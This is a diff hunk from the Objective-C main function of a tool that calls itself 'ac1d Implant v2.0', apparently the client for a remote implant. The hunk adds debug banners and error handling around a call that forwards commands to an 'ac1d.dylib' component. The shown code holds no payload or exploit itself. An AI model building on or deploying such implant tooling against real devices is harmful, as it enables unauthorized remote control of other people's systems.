@@ -70,11 +70,15 @@ int main(int argc, const char *argv[]) {
                     [command_args addObject:args[i]];
                 }
                 if ([commands containsObject:args[2]]) {
+                    if (debug) printf("[i] ac1d Implant v2.0\n");
+                    if (debug) printf("[i] Copyright (c) 2020 Ivan Nikolsky\n");
+                    if (debug) printf("[*] Executing %s...\n", [args[2] UTF8String]);
                     NSString *result = [ac1d_base sendCommand:command_args];
-                    printf("%s", [result UTF8String]);
-                } else {
-                    showHelpMessage();
-                }
+                    if (result) {
+                        if ([result isEqualToString:@""]) if (debug) printf("[!] Command output empty, sending anyway.\n");
+                        printf("%s", [result UTF8String]);
+                    } else if (debug) printf("[-] Failed to execute command, ac1d.dylib not found!\n");
+                } else showHelpMessage();
             } else showHelpMessage();
         }
     }
